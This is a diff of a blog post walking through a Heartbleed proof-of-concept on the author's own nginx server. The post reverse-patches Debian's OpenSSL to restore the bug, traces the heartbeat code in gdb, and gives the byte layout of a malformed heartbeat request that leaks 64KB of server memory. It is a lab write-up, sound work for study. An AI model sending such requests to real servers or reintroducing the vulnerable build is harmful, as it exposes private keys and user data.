@@ -9,11 +9,10 @@ pygments: true
 
 Summary
 ======
-This post presents a Proof Of Concept of the Heartbleed bug.
-The aim was to attempt to exploit the well known bug to steal the private keys
-from my local instance using a vulnerable version of OpenSSL. Unfortunately the
-outcome was not the one being sought, but it has proven to be a very interesting
-experiment anyway.
+This post shows a proof of concept of the Heartbleed bug. I tried
+to exploit the bug to steal the private keys from a local instance 
+using a vulnerable version of OpenSSL. I was unsuccessful, but it has proven 
+a very interesting experiment anyway.
 
 The bug
 =======
@@ -29,7 +28,7 @@ A heartbeat request is a way to check if the remote end of the connection is sti
 alive. The client sends a request with a custom payload and the server is supposed
 to echo back the same data.
 
-```c
+{% highlight c  %}
 /* Allocate memory for the response, size is 1 bytes
  * message type, plus 2 bytes payload length, plus
  * payload, plus padding
@@ -45,7 +44,7 @@ bp += payload;
 
 /* Random padding */
 RAND_pseudo_bytes(bp, padding);
-```
+{% endhighlight %}
 
 `payload` is the length of the payload of the heartbeat request sent by the client,
 which is read directly from the incoming message. `pl` points to an area in memory
@@ -81,7 +80,7 @@ own instance. I am running Debian Wheezy 7.1 and, according to apt, the openssl
 version I have
 installed on my machine is `1.0.1e`.
 
-```text
+{% highlight text  %}
 $ sudo apt-cache policy openssl
 openssl:
   Installed: 1.0.1e-2+deb7u14
@@ -92,25 +91,25 @@ openssl:
         100 /var/lib/dpkg/status
      1.0.1e-2+deb7u13 0
         500 http://ftp.ch.debian.org/debian/ wheezy/main i386 Packages
-```
+{% endhighlight %}
 
 At a first glance, this might appear to be a vulnerable release, but the output
 of openssl version shows that the package has been compiled in early 2015, 
 well after the disclosure of the bug.
 
-```text
+{% highlight text  %}
 $ openssl version -a
 OpenSSL 1.0.1e 11 Feb 2013
 built on: Thu Jan  8 21:47:50 UTC 2015
 platform: debian-i386-i686/cmov
 options:  bn(64,32) rc4(8x,mmx) des(ptr,risc1,16,long) blowfish(idx)
 [...]
-```
+{% endhighlight %}
 
 The changelog for `openssl_1.0.1e-2+deb7u14` shows that on April the 7th,
 Heartbleed was fixed incrementing the release to deb7u5.
 
-```text
+{% highlight text  %}
 openssl (1.0.1e-2+deb7u5) wheezy-security; urgency=high
 
   * Non-maintainer upload by the Security Team.
@@ -121,7 +120,7 @@ openssl (1.0.1e-2+deb7u5) wheezy-security; urgency=high
     server.
 
  -- Salvatore Bonaccorso <carnil@debian.org>  Mon, 07 Apr 2014 22:26:55 +0200
-```
+{% endhighlight %}
 
 The openssl version installed on my machine is therefore not vulnerable. In order to
 restore the bug, the package must be rebuilt without applying the fix. The easiest
@@ -129,7 +128,7 @@ way to do so is via a reverse patch, since by default apt applies
 automatically all the patches included in the package after having fetched the sources
 via `apt-get source`.
 
-```text
+{% highlight text  %}
 $ apt-get source openssl
 [...]
 cd openssl-1.0.1e/debian/patches/
@@ -137,7 +136,7 @@ interdiff CVE-2014-0160.patch /dev/null > hb_reversed.patch
 mv hb_reversed.patch ../../
 cd ../..
 patch -p1 < hb_reversed.patch
-```
+{% endhighlight %}
 
 The changes must be committed with `dpkg-source --commit`
 (it is not possible to compile the new package until then). This will
@@ -152,7 +151,7 @@ Once done, `openssl_1.0.1e-2+deb7u14.1_i386.deb` and related packages will be
 available. Heartbleed vulnerability comes from libssl1.0.0 and the package
 that should be installed is `libssl1.0.0_1.0.1e-2+deb7u14.1_i386.deb`.
 
-```text
+{% highlight text  %}
 $ sudo dpkg -i libssl1.0.0_1.0.1e-2+deb7u14.1_i386.deb
 (Reading database ... 203151 files and directories currently installed.)
 Preparing to replace libssl1.0.0:i386 1.0.1e-2+deb7u14.1 (using libssl1.0.0_1.0.1e-2+deb7u14.1_i386.deb) ...
@@ -170,12 +169,12 @@ libssl1.0.0:
         500 http://security.debian.org/ wheezy/updates/main i386 Packages
      1.0.1e-2+deb7u13 0
         500 http://ftp.ch.debian.org/debian/ wheezy/main i386 Packages
-```
+{% endhighlight %}
 
 It is possible to revert to the old clean package by passing a specific version to
 apt.
 
-```text
+{% highlight text  %}
 $ sudo apt-get install libssl1.0.0=1.0.1e-2+deb7u14
 Reading package lists... Done
 Building dependency tree
@@ -192,7 +191,7 @@ dpkg: warning: downgrading libssl1.0.0:i386 from 1.0.1e-2+deb7u14.1 to 1.0.1e-2+
 Preparing to replace libssl1.0.0:i386 1.0.1e-2+deb7u14.1 (using .../libssl1.0.0_1.0.1e-2+deb7u14_i386.deb) ...
 Unpacking replacement libssl1.0.0:i386 ...
 Setting up libssl1.0.0:i386 (1.0.1e-2+deb7u14) ...
-```
+{% endhighlight %}
 
 nginx installation
 ==================
@@ -201,7 +200,7 @@ nginx can be configured to enable HTTPS connections by simply adding the followi
 does not clash with other `server` definitions included from `/etc/nginx/sites-enabled`.
 The default configuration file is `/etc/nginx/nginx.conf`.
 
-```text
+{% highlight text  %}
 server {
     listen              443 ssl;
     server_name         localhost;
@@ -212,14 +211,14 @@ server {
             index  index.html index.htm;
     }
 }
-```
+{% endhighlight %}
 
 Heartbeat request
 =================
 The very first step to exploit Heartbleed is to send a proper heartbeat request 
 to the nginx instance, making sure the server echoes back the payload of the message.
 
-```python
+{% highlight python %}
 0x18                    # Type: Heartbeat
 0x03 0x02               # Protocol: TLS 1.1 (SSL v3.2)
 0x00 0x17               # Record length, size of the heartbeat message
@@ -230,7 +229,7 @@ to the nginx instance, making sure the server echoes back the payload of the mes
 0xDA 0xC8 0xFC 0x92     #
 0x9E 0xEE 0xD4 0x3B     #
 0x93 0xDD 0x7D 0xB5     #
-```
+{% endhighlight %}
 
 It turned out to be a bit more complicated than that. The heartbeat message is sent
 to the server but no response whatsoever is returned. The picture below shows
@@ -239,7 +238,7 @@ be considered as well-formatted.
 
 <p align="center">
 <a id="single_image" href="/img/heartbleed/hb_good_request_detail.png">
-<img  src="/img/heartbleed/hb_good_request_detail.png" alt=""/></a>
+<img  src="../img/heartbleed/hb_good_request_detail.png" alt=""/></a>
 </p>
 
 Even if the SSL handshake is not terminated, as shown by the traffic dump,
@@ -267,20 +266,20 @@ step execution `libssl` must be re-compiled with debug symbols and without optim
 `CFLAGS` used by dpkg are set in `/etc/dpkg/buildflags.conf`. The following should
 do the job:
 
-```text
+{% highlight text  %}
 SET CFLAGS -g -O0 -fstack-protector --param=ssp-buffer-size=4 -Wformat -Werror=format-security
-```
+{% endhighlight %}
 
 A further simplification which makes debugging easier is
 to add the following directive in `/etc/nginx/nginx.conf` in order to spawn
 only one worker thread for serving incoming requests:
 
-```text
+{% highlight text  %}
 worker_processes 1;
-```
+{% endhighlight %}
 After restarting nginx, gdb can be attached to the worker process.
 
-```text
+{% highlight text  %}
 $ ps aux | grep nginx
 root      5210  0.0  0.0  11980   960 ?        Ss   10:15   0:00 nginx: master process /usr/sbin/nginx
 www-data  5211  0.0  0.0  12144  1356 ?        S    10:15   0:00 nginx: worker process
@@ -296,38 +295,38 @@ This GDB was configured as "i486-linux-gnu".
 For bug reporting instructions, please see:
 <http://www.gnu.org/software/gdb/bugs/>.
 (gdb) attach 5211
-```
+{% endhighlight %}
 
 gdb tries to load the symbols of all the shared objects mapped in the address space of the process,
 including libssl.so.1.0.0, which should result in the following messages:
 
-```text
+{% highlight text  %}
 Reading symbols from /usr/lib/i386-linux-gnu/i686/cmov/libssl.so.1.0.0...done.
 Loaded symbols for /usr/lib/i386-linux-gnu/i686/cmov/libssl.so.1.0.0
-```
+{% endhighlight %}
 
 gdb should also be pointed to the location of the source code with the `directory`
 command.
 
-```text
+{% highlight text  %}
 (gdb) directory <path-of-the-sources-of-the-dpkg-package>/openssl-1.0.1e/ssl
 Source directories searched: <path-of-the-sources-of-the-dpkg-package>/openssl-1.0.1e/ssl:$cdir:$cwd
-```
+{% endhighlight %}
 
 A breakpoint on `tls1_process_heartbeat` can be set and the execution resumed.
 
-```text
+{% highlight text  %}
 (gdb) break tls1_process_heartbeat
 Breakpoint 1 at 0xb76c29d4: file t1_lib.c, line 2579.
 (gdb) c
 Continuing.
-```
+{% endhighlight %}
 
 Now, upon receiving a heartbeat message, the code will hit the breakpoint, allowing
 step by step execution.
 
 
-```text
+{% highlight text  %}
 Breakpoint 1, tls1_process_heartbeat (s=0x9910a58) at t1_lib.c:2579
 2579        unsigned char *p = &s->s3->rrec.data[0], *pl;
 (gdb) s
@@ -339,12 +338,12 @@ Breakpoint 1, tls1_process_heartbeat (s=0x9910a58) at t1_lib.c:2579
 (gdb)
 2587        pl = p;
 (gdb)
-```
+{% endhighlight %}
 
 The control path which explains why a heartbeat response is not echoed back to the
 client leads to function `buffer_write` in `bf_buff.c`.
 
-```text
+{% highlight text  %}
 Breakpoint 1, tls1_process_heartbeat (s=0x9910a58) at t1_lib.c:2579
 [...]
 2614            r = ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload + padding);
@@ -381,12 +380,12 @@ ssl3_write_bytes (s=0x9910a58, type=24, buf_=0x99609a8, len=23) at s3_pkt.c:584
                 (gdb)
             BIO_write (b=0x99128b0, in=0x995b8cb, inl=28) at bio_lib.c:249
             249     if (i > 0) b->num_write+=(unsigned long)i;
-```
+{% endhighlight %}
 
 A full trace is available <a href="/includes/hb_trace.txt" target="_blank">here</a>.
 The `buffer_write` function is defined in `crypto/bio/bf_buf.c`.
 
-```c
+{% highlight c  %}
 static int buffer_write(BIO *b, const char *in, int inl)
     {
     int i,num=0;
@@ -459,7 +458,7 @@ start:
          * amount left */
         goto start;
         }
-```
+{% endhighlight %}
 
 This function copies the data passed as argument with pointer `*in` into
 the buffer pointed by the BIO object `*b`. The decision whether to flush or not
@@ -468,18 +467,18 @@ the size of the BIO buffer. If the former is smaller than the latter, the buffer
 not flushed. In this case the heartbeat response message is 28 bytes and the buffer
 is 4KB, which prevents the data from being flushed.
 
-```text
+{% highlight text  %}
 (gdb) print i
 $1 = 4096
 (gdb) print inl
 $2 = 28
-```
+{% endhighlight %}
 
 What happens if the size of the heartbeat message is bigger than the buffer, say 5000
 bytes? I used <a href="https://github.com/marcoguerri/heartbleed/blob/master/send_heartbeat.c" target="_blank"> heartbeat\_send.c</a>
 to send a well-formed heartbeat request while tracing `buffer_write`.
 
-```text
+{% highlight text  %}
     (gdb)
     247     i=b->method->bwrite(b,in,inl);
     (gdb) s
@@ -526,7 +525,7 @@ to send a well-formed heartbeat request while tracing `buffer_write`.
     249     if (i > 0) b->num_write+=(unsigned long)i;
     (gdb) print i
     $5 = 5000
-```
+{% endhighlight %}
 
 The loop at line 250 writes 5000 bytes in the output buffer, which is then flushed through
 the socket; the client receives a well-formed heartbeat response with a payload
@@ -544,14 +543,14 @@ Heartbleed request
 A malformed heartbeat request features a payload size which does not match the actual
 length of the data carried inside the message.
 
-```python
+{% highlight python %}
 0x18                    # Type: Heartbeat
 0x03 0x02               # Protocol: TLS 1.1 (SSL v3.2)
 0x00 0x03               # Record length, size of the heartbeat message
 0x01                    # heartbeat message type: request
 0xFF 0xFF               # Payload size, does not match the actual size of the payload
                         # No payload
-```
+{% endhighlight %}
 
 Due to the lack of checks on the payload size, the server returns 65536 bytes
 copied from the address space of the process: <a href="https://github.com/marcoguerri/heartbleed/blob/master/send_heartbeat.c" target="_blank"> heartbeat\_send.c</a>
@@ -559,13 +558,13 @@ can be adapted to send a malformed request. The heartbeat response message conta
 of payload, 16 bytes of padding and 4 bytes of header, 65556 in total.
 
 
-```text
+{% highlight text  %}
 $ ./send_heartbleed
 Initializing new connection...
 Connecting...
 Connected!
 resplen:  65556
-```
+{% endhighlight %}
 
 Scanning leaked memory
 =============================
